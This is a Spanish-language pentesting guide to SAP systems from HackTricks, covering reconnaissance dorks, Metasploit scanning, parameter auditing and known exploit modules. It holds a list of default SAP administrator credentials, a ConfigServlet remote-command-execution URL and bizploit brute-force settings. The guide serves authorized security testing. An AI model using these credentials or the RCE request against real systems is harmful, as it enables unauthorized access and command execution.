{{#include ../banners/hacktricks-training.md}}

# Introducción sobre SAP

SAP significa Sistemas, Aplicaciones y Productos en el Procesamiento de Datos. SAP, por definición, también es el nombre del software ERP \(Planificación de Recursos Empresariales\) así como el nombre de la empresa. El sistema SAP consiste en una serie de módulos totalmente integrados, que cubren prácticamente todos los aspectos de la gestión empresarial.

Cada instancia de SAP \(o SID\) se compone de tres capas: base de datos, aplicación y presentación\), cada paisaje generalmente consiste en cuatro instancias: dev, test, QA y producción. Cada una de las capas puede ser explotada hasta cierto punto, pero el mayor efecto se puede obtener al **atacar la base de datos**.

Cada instancia de SAP se divide en clientes. Cada uno tiene un usuario SAP\*, el equivalente de la aplicación a “root”. Al momento de la creación inicial, este usuario SAP\* recibe una contraseña predeterminada: “060719992” \(más contraseñas predeterminadas a continuación\). ¡Te sorprendería saber con qué frecuencia estas **contraseñas no se cambian en entornos de prueba o desarrollo**!

Intenta obtener acceso a la shell de cualquier servidor usando el nombre de usuario &lt;SID&gt;adm. El bruteforcing puede ayudar, sin embargo, puede haber un mecanismo de bloqueo de cuenta.

# Descubrimiento

> La siguiente sección es principalmente de [https://github.com/shipcod3/mySapAdventures](https://github.com/shipcod3/mySapAdventures) del usuario shipcod3!

- Verifica el Alcance de la Aplicación o el Resumen del Programa para pruebas. Toma nota de los nombres de host o instancias del sistema para conectarte a SAP GUI.
- Utiliza OSINT \(inteligencia de código abierto\), Shodan y Google Dorks para buscar archivos, subdominios e información valiosa si la aplicación está expuesta a Internet o es pública:
```text
inurl:50000/irj/portal
inurl:IciEventService/IciEventConf
inurl:/wsnavigator/jsps/test.jsp
inurl:/irj/go/km/docs/
https://www.shodan.io/search?query=sap+portal
https://www.shodan.io/search?query=SAP+Netweaver
https://www.shodan.io/search?query=SAP+J2EE+Engine
```
- Aquí está cómo se ve [http://SAP:50000/irj/portal](http://sap:50000/irj/portal)

![Pantalla de inicio de sesión de SAP](https://raw.githubusercontent.com/shipcod3/mySapAdventures/master/screengrabs/sap%20logon.jpeg)

- Usa nmap para verificar puertos abiertos y servicios conocidos \(enrutadores sap, webdynpro, servicios web, servidores web, etc.\)
- Rastrea las URLs si hay un servidor web en funcionamiento.
- Fuzz las directorios \(puedes usar Burp Intruder\) si tiene servidores web en ciertos puertos. Aquí hay algunas buenas listas de palabras proporcionadas por el proyecto SecLists para encontrar rutas ICM predeterminadas de SAP y otros directorios o archivos interesantes:

[https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/URLs/urls_SAP.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/URLs/urls-SAP.txt)
[https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/SAP.fuzz.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/SAP.fuzz.txt)
[https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/sap.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/sap.txt)

- Usa el módulo auxiliar de Metasploit SAP SERVICE DISCOVERY para enumerar instancias/servicios/componentes de SAP:
```text
msf > use auxiliary/scanner/sap/sap_service_discovery
msf auxiliary(sap_service_discovery) > show options
Module options (auxiliary/scanner/sap/sap_service_discovery):
Name         Current Setting  Required  Description
----         ---------------  --------  -----------
CONCURRENCY  10               yes       The number of concurrent ports to check per host
INSTANCES    00-01            yes       Instance numbers to scan (e.g. 00-05,00-99)
RHOSTS                        yes       The target address range or CIDR identifier
THREADS      1                yes       The number of concurrent threads
TIMEOUT      1000             yes       The socket connect timeout in milliseconds
msf auxiliary(sap_service_discovery) > set rhosts 192.168.96.101
rhosts => 192.168.96.101
msf auxiliary(sap_service_discovery) > run
[*] 192.168.96.101:       - [SAP] Beginning service Discovery '192.168.96.101'
```
## Pruebas del Cliente Grueso / SAP GUI

Aquí está el comando para conectarse a SAP GUI  
`sapgui <sap server hostname> <system number>`

- Verifique las credenciales predeterminadas \(En la Taxonomía de Calificación de Vulnerabilidades de Bugcrowd, esto se considera P1 -&gt; Configuración Incorrecta de Seguridad del Servidor \| Uso de Credenciales Predeterminadas \| Servidor de Producción\):
```text
# SAP* - High privileges - Hardcoded kernel user
SAP*:06071992:*
SAP*:PASS:*
# IDEADM - High Privileges - Only in IDES systems
IDEADM:admin:*
# DDIC - High privileges - User has SAP_ALL
DDIC:19920706:000,001
# EARLYWATCH - High privileges
EARLYWATCH:SUPPORT:066
# TMSADM - Medium privileges
TMSADM:PASSWORD:000
TMSADM:$1Pawd2&:000
# SAPCPIC - Medium privileges
SAPCPIC:ADMIN:000,001
# SOLMAN dialog default users and passwords.
# For more info check:
# https://www.troopers.de/media/filer_public/37/34/3734ebb3-989c-4750-9d48-ea478674991a/an_easy_way_into_your_sap_systems_v30.pdf
# https://launchpad.support.sap.com/#/notes/2293011
# SOLMAN_ADMIN - High privileges - Only on SOLMAN systems
SOLMAN_ADMIN:init1234:*
# SAPSUPPORT - High privileges - Only on SOLMAN or satellite systems
SAPSUPPORT:init1234:*
# SOLMAN<SID><CLNT> - High privileges - Only on SOLMAN systems
#SOLMAN<SID><CLNT>:init1234:*
# Trial systems
# -------------
# AS ABAP 7.40 SP08 Developer Edition:
# https://blogs.sap.com/2015/10/14/sap-netweaver-as-abap-740-sp8-developer-edition-to-download-consise-installation-instruction/
DDIC:DidNPLpw2014:001
SAP*:DidNPLpw2014:001
DEVELOPER:abCd1234:001
BWDEVELOPER:abCd1234:001
# AS ABAP 7.50 SP02 Developer Edition:
# https://blogs.sap.com/2016/11/03/sap-nw-as-abap-7.50-sp2-developer-edition-to-download-consise-installation-guide/
# AS ABAP 7.51 SP02 Developer Edition:
# https://blogs.sap.com/2017/09/04/sap-as-abap-7.51-sp2-developer-edition-to-download-concise-installation-guide/
DDIC:Appl1ance:000,001
SAP*:Appl1ance:000,001
DEVELOPER:Appl1ance:001
BWDEVELOPER:Appl1ance:001
# AS ABAP 7.51 SP01 Developer Edition:
# https://blogs.sap.com/2018/09/13/as-abap-7.52-sp01-developer-edition-concise-installation-guide/
# AS ABAP 7.52 SP04 Developer Edition:
# https://blogs.sap.com/2019/10/01/as-abap-7.52-sp04-developer-edition-concise-installation-guide/
DDIC:Down1oad:000,001
SAP*:Down1oad:000,001
DEVELOPER:Down1oad:001
BWDEVELOPER:Down1oad:001
```
- Ejecuta Wireshark y luego autentícate en el cliente \(SAP GUI\) usando las credenciales que obtuviste porque algunos clientes transmiten credenciales sin SSL. También hay dos complementos conocidos para Wireshark que pueden descomponer los encabezados principales utilizados por el protocolo SAP DIAG: SecureAuth Labs SAP dissection plug-in y SAP DIAG plugin by Positive Research Center.
- Verifica escalaciones de privilegios como usar algunos Códigos de Transacción SAP \(tcodes\) para usuarios de bajo privilegio:
- SU01 - Para crear y mantener los usuarios
- SU01D - Para mostrar usuarios
- SU10 - Para mantenimiento masivo
- SU02 - Para creación manual de perfiles
- SM19 - Auditoría de seguridad - configuración
- SE84 - Sistema de Información para Autorizaciones SAP R/3
- Verifica si puedes ejecutar comandos del sistema / ejecutar scripts en el cliente.
- Verifica si puedes hacer XSS en BAPI Explorer

# Pruebas de la interfaz web

- Rastrea las URLs \(ver fase de descubrimiento\).
- Fuzz las URLs como en la fase de descubrimiento. Así es como se ve [http://SAP:50000/index.html](http://sap:50000/index.html):

![SAP Index Page](https://raw.githubusercontent.com/shipcod3/mySapAdventures/master/screengrabs/index.jpeg)

- Busca vulnerabilidades web comunes \(Consulta OWASP Top 10\) porque hay vulnerabilidades de XSS, RCE, XXE, etc. en algunos lugares.
- Consulta la [“Metodología de Cazadores de Errores”](https://github.com/jhaddix/tbhm) de Jason Haddix para probar vulnerabilidades web.
- ¿Bypass de autenticación a través de manipulación de verbos? Quizás :\)
- Abre `http://SAP:50000/webdynpro/resources/sap.com/XXX/JWFTestAddAssignees#` y luego presiona el botón “Elegir” y luego en la ventana abierta presiona “Buscar”. Deberías poder ver una lista de usuarios SAP \(Referencia de Vulnerabilidad: [ERPSCAN-16-010](https://erpscan.com/advisories/erpscan-16-010-sap-netweaver-7-4-information-disclosure/)\)
- ¿Se envían las credenciales a través de HTTP? Si es así, se considera P3 según la [Taxonomía de Clasificación de Vulnerabilidades](https://bugcrowd.com/vulnerability-rating-taxonomy) de Bugcrowd: Autenticación Rota y Gestión de Sesiones \| Función de Inicio de Sesión Débil a través de HTTP. Sugerencia: Consulta también [http://SAP:50000/startPage](http://sap:50000/startPage) o los portales de inicio de sesión :\)

![SAP Start Page](https://raw.githubusercontent.com/shipcod3/mySapAdventures/master/screengrabs/startPage.jpeg)

- Prueba `/irj/go/km/navigation/` para posible listado de directorios o bypass de autenticación
- [http://SAP/sap/public/info](http://sap/sap/public/info) contiene información valiosa:
```xml
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
<SOAP-ENV:Body>
<rfc:RFC_SYSTEM_INFO.Response xmlns:rfc="urn:sap-com:document:sap:rfc:functions">
<RFCSI>
<RFCPROTO>011</RFCPROTO>
<RFCCHARTYP>4102</RFCCHARTYP>
<RFCINTTYP>BIG</RFCINTTYP>
<RFCFLOTYP>IE3</RFCFLOTYP>
<RFCDEST>randomnum</RFCDEST>
<RFCHOST>randomnum</RFCHOST>
<RFCSYSID>BRQ</RFCSYSID>
<RFCDATABS>BRQ</RFCDATABS>
<RFCDBHOST>randomnum</RFCDBHOST>
<RFCDBSYS>ORACLE</RFCDBSYS>
<RFCSAPRL>740</RFCSAPRL>
<RFCMACH>324</RFCMACH>
<RFCOPSYS>AIX</RFCOPSYS>
<RFCTZONE>-25200</RFCTZONE>
<RFCDAYST/>
<RFCIPADDR>192.168.1.8</RFCIPADDR>
<RFCKERNRL>749</RFCKERNRL>
<RFCHOST2>randomnum</RFCHOST2>
<RFCSI_RESV/>
<RFCIPV6ADDR>192.168.1.8</RFCIPV6ADDR>
</RFCSI>
</rfc:RFC_SYSTEM_INFO.Response>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```
# Parámetros de Configuración

Si tienes los detalles de inicio de sesión correctos durante el pentest o has logrado iniciar sesión en SAP GUI utilizando credenciales básicas, puedes verificar los valores de los parámetros. Muchos valores de parámetros de configuración básicos y personalizados se consideran vulnerabilidades.

Puedes verificar los valores de los parámetros tanto manualmente como automáticamente, utilizando scripts (por ejemplo, [SAP Parameter Validator](https://github.com/damianStrojek/SAPPV)).

## Verificación Manual de Parámetros

Al navegar al Código de Transacción `RSPFPAR`, puedes consultar diferentes parámetros y buscar sus valores.

La tabla a continuación contiene los parámetros definidos y las condiciones por las cuales se distinguen.

Por ejemplo, si <i>gw/reg_no_conn_info</i> está configurado en menos de 255 (`<255`), entonces debe considerarse como una amenaza. De manera similar, si <i>icm/security_log</i> es igual a dos (`2`), también será una posible amenaza.

| Parámetro                                     | Restricción | Descripción                                                                   |
| --------------------------------------------- | ----------- | ----------------------------------------------------------------------------- |
| `auth/object_disabling_active`                | `Y`         | Indica si la desactivación de objetos está activa.                           |
| `auth/rfc_authority_check`                    | `<2`        | Establece el nivel de verificación de autoridad para RFCs.                   |
| `auth/no_check_in_some_cases`                 | `Y`         | Especifica si se omiten las verificaciones en algunos casos.                 |
| `bdc/bdel_auth_check`                         | `FALSE`     | Determina si se aplican verificaciones de autorización en BDC.               |
| `gw/reg_no_conn_info`                         | `<255`      | Limita el número de caracteres para la información de conexión del número de registro. |
| `icm/security_log`                            | `2`         | Define el nivel de registro de seguridad para ICM (Internet Communication Manager). |
| `icm/server_port_0`                           | `Display`   | Especifica el puerto del servidor para ICM (puerto 0).                       |
| `icm/server_port_1`                           | `Display`   | Especifica el puerto del servidor para ICM (puerto 1).                       |
| `icm/server_port_2`                           | `Display`   | Especifica el puerto del servidor para ICM (puerto 2).                       |
| `login/password_compliance_to_current_policy` | `0`         | Aplica el cumplimiento de la contraseña con la política actual.              |
| `login/no_automatic_user_sapstar`             | `0`         | Desactiva la asignación automática de usuario SAPSTAR.                       |
| `login/min_password_specials`                 | `0`         | Número mínimo de caracteres especiales requeridos en las contraseñas.       |
| `login/min_password_lng`                      | `<8`        | Longitud mínima requerida para las contraseñas.                              |
| `login/min_password_lowercase`                | `0`         | Número mínimo de letras minúsculas requeridas en las contraseñas.           |
| `login/min_password_uppercase`                | `0`         | Número mínimo de letras mayúsculas requeridas en las contraseñas.           |
| `login/min_password_digits`                   | `0`         | Número mínimo de dígitos requeridos en las contraseñas.                     |
| `login/min_password_letters`                  | `1`         | Número mínimo de letras requeridas en las contraseñas.                      |
| `login/fails_to_user_lock`                    | `<5`        | Número de intentos de inicio de sesión fallidos antes de bloquear la cuenta de usuario. |
| `login/password_expiration_time`              | `>90`       | Tiempo de expiración de la contraseña en días.                               |
| `login/password_max_idle_initial`             | `<14`       | Tiempo máximo de inactividad en minutos antes de requerir la reintroducción de la contraseña (inicial). |
| `login/password_max_idle_productive`          | `<180`      | Tiempo máximo de inactividad en minutos antes de requerir la reintroducción de la contraseña (productivo). |
| `login/password_downwards_compatibility`      | `0`         | Especifica si la compatibilidad hacia atrás para contraseñas está habilitada. |
| `rfc/reject_expired_passwd`                   | `0`         | Determina si se rechazan las contraseñas expiradas para RFC (Remote Function Calls). |
| `rsau/enable`                                 | `0`         | Habilita o deshabilita las verificaciones de RS AU (Autorización).          |
| `rdisp/gui_auto_logout`                       | `<5`        | Especifica el tiempo en minutos antes del cierre de sesión automático de las sesiones GUI. |
| `service/protectedwebmethods`                 | `SDEFAULT`  | Especifica la configuración predeterminada para métodos web protegidos.     |
| `snc/enable`                                  | `0`         | Habilita o deshabilita la Comunicación de Red Segura (SNC).                 |
| `ucon/rfc/active`                             | `0`         | Activa o desactiva los RFCs de UCON (Conectividad Unificada).               |

## Script para Verificación de Parámetros

Debido al número de parámetros, también es posible exportar todos ellos a un archivo .XML y utilizar el script [SAPPV (SAP Parameter Validator)](https://github.com/damianStrojek/SAPPV), que verificará todos los parámetros mencionados anteriormente y los imprimirá con la distinción apropiada.
```
./SAPPV.sh EXPORT.XML

Parameter: auth/no_check_in_some_cases
User-Defined Value: No data
System Default Value: Y
Comment: Activation of the Profile Generator
Vulnerability: "SAP Parameter Misconfiguration: auth/no_check_in_some_cases"

Parameter: auth/object_disabling_active
User-Defined Value: N
System Default Value: N
Comment: Value 'N' prohibits disabling of authorization objects
Vulnerability: "SAP Parameter Misconfiguration: auth/object_disabling_active"

Parameter: auth/rfc_authority_check
User-Defined Value: 6
System Default Value: 6
Comment: Execution option for the RFC authority check
Vulnerability: "SAP Parameter Misconfiguration: auth/rfc_authority_check"

Parameter: bdc/bdel_auth_check
User-Defined Value: No data
System Default Value: FALSE
Comment: batch-input: check authorisation for activity DELE when delete TA
Vulnerability: "SAP Parameter Misconfiguration: bdc/bdel_auth_check"

[...]
```
# ¡Ataque!

- Verifique si se ejecuta en servidores o tecnologías antiguas como Windows 2000.
- Planifique los posibles exploits / ataques, hay muchos módulos de Metasploit para el descubrimiento de SAP \(módulos auxiliares\) y exploits:
```text
msf > search sap
Matching Modules
================
Name                                                                     Disclosure Date  Rank       Description
----                                                                     ---------------  ----       -----------
auxiliary/admin/maxdb/maxdb_cons_exec                                    2008-01-09       normal     SAP MaxDB cons.exe Remote Command Injection
auxiliary/admin/sap/sap_configservlet_exec_noauth                        2012-11-01       normal     SAP ConfigServlet OS Command Execution
auxiliary/admin/sap/sap_mgmt_con_osexec                                                   normal     SAP Management Console OSExecute
auxiliary/dos/sap/sap_soap_rfc_eps_delete_file                                            normal     SAP SOAP EPS_DELETE_FILE File Deletion
auxiliary/dos/windows/http/pi3web_isapi                                  2008-11-13       normal     Pi3Web ISAPI DoS
auxiliary/dos/windows/llmnr/ms11_030_dnsapi                              2011-04-12       normal     Microsoft Windows DNSAPI.dll LLMNR Buffer Underrun DoS
auxiliary/scanner/http/sap_businessobjects_user_brute                                     normal     SAP BusinessObjects User Bruteforcer
auxiliary/scanner/http/sap_businessobjects_user_brute_web                                 normal     SAP BusinessObjects Web User Bruteforcer
auxiliary/scanner/http/sap_businessobjects_user_enum                                      normal     SAP BusinessObjects User Enumeration
auxiliary/scanner/http/sap_businessobjects_version_enum                                   normal     SAP BusinessObjects Version Detection
auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt                                    normal     SAP CTC Service Verb Tampering User Management
auxiliary/scanner/sap/sap_hostctrl_getcomputersystem                                      normal     SAP Host Agent Information Disclosure
auxiliary/scanner/sap/sap_icf_public_info                                                 normal     SAP ICF /sap/public/info Service Sensitive Information Gathering
auxiliary/scanner/sap/sap_icm_urlscan                                                     normal     SAP URL Scanner
auxiliary/scanner/sap/sap_mgmt_con_abaplog                                                normal     SAP Management Console ABAP Syslog Disclosure
auxiliary/scanner/sap/sap_mgmt_con_brute_login                                            normal     SAP Management Console Brute Force
auxiliary/scanner/sap/sap_mgmt_con_extractusers                                           normal     SAP Management Console Extract Users
auxiliary/scanner/sap/sap_mgmt_con_getaccesspoints                                        normal     SAP Management Console Get Access Points
auxiliary/scanner/sap/sap_mgmt_con_getenv                                                 normal     SAP Management Console getEnvironment
auxiliary/scanner/sap/sap_mgmt_con_getlogfiles                                            normal     SAP Management Console Get Logfile
auxiliary/scanner/sap/sap_mgmt_con_getprocesslist                                         normal     SAP Management Console GetProcessList
auxiliary/scanner/sap/sap_mgmt_con_getprocessparameter                                    normal     SAP Management Console Get Process Parameters
auxiliary/scanner/sap/sap_mgmt_con_instanceproperties                                     normal     SAP Management Console Instance Properties
auxiliary/scanner/sap/sap_mgmt_con_listlogfiles                                           normal     SAP Management Console List Logfiles
auxiliary/scanner/sap/sap_mgmt_con_startprofile                                           normal     SAP Management Console getStartProfile
auxiliary/scanner/sap/sap_mgmt_con_version                                                normal     SAP Management Console Version Detection
auxiliary/scanner/sap/sap_router_info_request                                             normal     SAPRouter Admin Request
auxiliary/scanner/sap/sap_router_portscanner                                              normal     SAPRouter Port Scanner
auxiliary/scanner/sap/sap_service_discovery                                               normal     SAP Service Discovery
auxiliary/scanner/sap/sap_smb_relay                                                       normal     SAP SMB Relay Abuse
auxiliary/scanner/sap/sap_soap_bapi_user_create1                                          normal     SAP /sap/bc/soap/rfc SOAP Service BAPI_USER_CREATE1 Function User Creation
auxiliary/scanner/sap/sap_soap_rfc_brute_login                                            normal     SAP SOAP Service RFC_PING Login Brute Forcer
auxiliary/scanner/sap/sap_soap_rfc_dbmcli_sxpg_call_system_command_exec                   normal     SAP /sap/bc/soap/rfc SOAP Service SXPG_CALL_SYSTEM Function Command Injection
auxiliary/scanner/sap/sap_soap_rfc_dbmcli_sxpg_command_exec                               normal     SAP /sap/bc/soap/rfc SOAP Service SXPG_COMMAND_EXEC Function Command Injection
auxiliary/scanner/sap/sap_soap_rfc_eps_get_directory_listing                              normal     SAP SOAP RFC EPS_GET_DIRECTORY_LISTING Directories Information Disclosure
auxiliary/scanner/sap/sap_soap_rfc_pfl_check_os_file_existence                            normal     SAP SOAP RFC PFL_CHECK_OS_FILE_EXISTENCE File Existence Check
auxiliary/scanner/sap/sap_soap_rfc_ping                                                   normal     SAP /sap/bc/soap/rfc SOAP Service RFC_PING Function Service Discovery
auxiliary/scanner/sap/sap_soap_rfc_read_table                                             normal     SAP /sap/bc/soap/rfc SOAP Service RFC_READ_TABLE Function Dump Data
auxiliary/scanner/sap/sap_soap_rfc_rzl_read_dir                                           normal     SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing
auxiliary/scanner/sap/sap_soap_rfc_susr_rfc_user_interface                                normal     SAP /sap/bc/soap/rfc SOAP Service SUSR_RFC_USER_INTERFACE Function User Creation
auxiliary/scanner/sap/sap_soap_rfc_sxpg_call_system_exec                                  normal     SAP /sap/bc/soap/rfc SOAP Service SXPG_CALL_SYSTEM Function Command Execution
auxiliary/scanner/sap/sap_soap_rfc_sxpg_command_exec                                      normal     SAP SOAP RFC SXPG_COMMAND_EXECUTE
auxiliary/scanner/sap/sap_soap_rfc_system_info                                            normal     SAP /sap/bc/soap/rfc SOAP Service RFC_SYSTEM_INFO Function Sensitive Information Gathering
auxiliary/scanner/sap/sap_soap_th_saprel_disclosure                                       normal     SAP /sap/bc/soap/rfc SOAP Service TH_SAPREL Function Information Disclosure
auxiliary/scanner/sap/sap_web_gui_brute_login                                             normal     SAP Web GUI Login Brute Forcer
exploit/multi/sap/sap_mgmt_con_osexec_payload                            2011-03-08       excellent  SAP Management Console OSExecute Payload Execution
exploit/multi/sap/sap_soap_rfc_sxpg_call_system_exec                     2013-03-26       great      SAP SOAP RFC SXPG_CALL_SYSTEM Remote Command Execution
exploit/multi/sap/sap_soap_rfc_sxpg_command_exec                         2012-05-08       great      SAP SOAP RFC SXPG_COMMAND_EXECUTE Remote Command Execution
exploit/windows/browser/enjoysapgui_comp_download                        2009-04-15       excellent  EnjoySAP SAP GUI ActiveX Control Arbitrary File Download
exploit/windows/browser/enjoysapgui_preparetoposthtml                    2007-07-05       normal     EnjoySAP SAP GUI ActiveX Control Buffer Overflow
exploit/windows/browser/sapgui_saveviewtosessionfile                     2009-03-31       normal     SAP AG SAPgui EAI WebViewer3D Buffer Overflow
exploit/windows/http/sap_configservlet_exec_noauth                       2012-11-01       great      SAP ConfigServlet Remote Code Execution
exploit/windows/http/sap_host_control_cmd_exec                           2012-08-14       average    SAP NetWeaver HostControl Command Injection
exploit/windows/http/sapdb_webtools                                      2007-07-05       great      SAP DB 7.4 WebTools Buffer Overflow
exploit/windows/lpd/saplpd                                               2008-02-04       good       SAP SAPLPD 6.28 Buffer Overflow
exploit/windows/misc/sap_2005_license                                    2009-08-01       great      SAP Business One License Manager 2005 Buffer Overflow
exploit/windows/misc/sap_netweaver_dispatcher                            2012-05-08       normal     SAP NetWeaver Dispatcher DiagTraceR3Info Buffer Overflow
```
- Intenta usar algunos exploits conocidos \(consulta Exploit-DB\) o ataques como el viejo pero bueno “SAP ConfigServlet Remote Code Execution” en el SAP Portal:
```text
http://example.com:50000/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=uname -a
```
![SAP Config Servlet RCE](https://raw.githubusercontent.com/shipcod3/mySapAdventures/master/screengrabs/sap_rce.jpeg)

- Antes de ejecutar el comando `start` en el script bizploit en la fase de Descubrimiento, también puedes agregar lo siguiente para realizar una evaluación de vulnerabilidades:
```text
bizploit> plugins
bizploit/plugins> vulnassess all
bizploit/plugins> vulnassess config bruteLogin
bizploit/plugins/vulnassess/config:bruteLogin> set type defaultUsers
bizploit/plugins/vulnassess/config:bruteLogin> set tryHardcodedSAPStar True
bizploit/plugins/vulnassess/config:bruteLogin> set tryUserAsPwd True
bizploit/plugins/vulnassess/config:bruteLogin> back
bizploit/plugins> vulnassess config registerExtServer
bizploit/plugins/vulnassess/config:registerExtServer> set tpname evilgw
bizploit/plugins/vulnassess/config:registerExtServer> back
bizploit/plugins> vulnassess config checkRFCPrivs
bizploit/plugins/vulnassess/config:checkRFCPrivs> set checkExtOSCommands True
bizploit/plugins/vulnassess/config:checkRFCPrivs> back
bizploit/plugins> vulnassess config icmAdmin
bizploit/plugins/vulnassess/config:icmAdmin> set adminURL /sap/admin
bizploit/plugins/vulnassess/config:icmAdmin> back
bizploit/plugins> start
bizploit/plugins> back
bizploit> start
```
# Otras Herramientas Útiles para Pruebas

- [PowerSAP](https://github.com/airbus-seclab/powersap) - Herramienta de Powershell para evaluar la seguridad de SAP
- [Burp Suite](https://portswigger.net/burp) - imprescindible para el fuzzing de directorios y evaluaciones de seguridad web
- [pysap](https://github.com/SecureAuthCorp/pysap) - Biblioteca de Python para crear paquetes del protocolo de red SAP
- [https://github.com/gelim/nmap-erpscan](https://github.com/gelim/nmap-erpscan) - Ayuda a nmap a detectar SAP/ERP

## Referencias

- [SAP Penetration Testing Using Metasploit](http://information.rapid7.com/rs/rapid7/images/SAP%20Penetration%20Testing%20Using%20Metasploit%20Final.pdf)
- [https://github.com/davehardy20/SAP-Stuff](https://github.com/davehardy20/SAP-Stuff) - un script para semi-automatizar Bizploit
- [SAP NetWeaver ABAP security configuration part 3: Default passwords for access to the application](https://erpscan.com/press-center/blog/sap-netweaver-abap-security-configuration-part-2-default-passwords-for-access-to-the-application/)
- [List of ABAP-transaction codes related to SAP security](https://wiki.scn.sap.com/wiki/display/Security/List+of+ABAP-transaction+codes+related+to+SAP+security)
- [Breaking SAP Portal](https://erpscan.com/wp-content/uploads/presentations/2012-HackerHalted-Breaking-SAP-Portal.pdf)
- [Top 10 most interesting SAP vulnerabilities and attacks](https://erpscan.com/wp-content/uploads/presentations/2012-Kuwait-InfoSecurity-Top-10-most-interesting-vulnerabilities-and-attacks-in-SAP.pdf)
- [Assessing the security of SAP ecosystems with bizploit: Discovery](https://www.onapsis.com/blog/assessing-security-sap-ecosystems-bizploit-discovery)
- [https://www.exploit-db.com/docs/43859](https://www.exploit-db.com/docs/43859)
- [https://resources.infosecinstitute.com/topic/pen-stesting-sap-applications-part-1/](https://resources.infosecinstitute.com/topic/pen-stesting-sap-applications-part-1/)
- [https://github.com/shipcod3/mySapAdventures](https://github.com/shipcod3/mySapAdventures)


{{#include ../banners/hacktricks-training.md}}
